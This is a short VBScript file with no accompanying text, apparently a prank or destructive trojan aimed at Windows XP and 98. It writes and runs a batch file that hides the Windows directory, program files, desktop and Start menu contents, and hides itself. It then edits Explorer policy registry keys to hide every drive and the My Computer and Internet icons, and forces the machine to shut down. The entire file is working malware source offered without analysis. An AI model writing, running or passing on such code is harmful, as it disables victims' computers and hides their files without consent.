Dim shell, fso, fikon

set shell = CreateObject("WScript.Shell")
set fso = CreateObject("Scripting.FileSystemObject")

set fikon = fso.CreateTextFile("C:\fikon.bat",True)
fikon.WriteLine "@echo off"
fikon.WriteLine "cls"
fikon.WriteLine "attrib +H %0"
fikon.WriteLine "attrib +H C:\program"
fikon.WriteLine "attrib +H %windir%"
fikon.WriteLine "if exist %ALLUSERSPROFILE% goto XP"
fikon.WriteLine "if exist C:\windows\skrivb~1 goto 98"
fikon.WriteLine ":XP"
fikon.WriteLine "cd %USERPROFILE%"
fikon.WriteLine "attrib +H skrivb~1\*.*"
fikon.WriteLine "attrib start-~1\*.* +h /s /d"
fikon.WriteLine "attrib C:\docume~1\alluse~1\start-~1\*.* +h /s /d"
fikon.WriteLine "attrib +H C:\docume~1\alluse~1\skrivb~1\*.*"
fikon.WriteLine "exit"
fikon.WriteLine ":98"
fikon.WriteLine "attrib +H C:\windows\skrivb~1\*.*"
fikon.WriteLine "exit"
fikon.Close
shell.run "c:\fikon.bat"

shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "67108863", "REG_DWORD"
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoInternetIcon", "1", "REG_DWORD"
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "1", "REG_DWORD"

on error resume next
shell.run "RUNDLL32.exe user.exe,exitwindows",vbhide
shell.run "shutdown.exe -s",vbhide
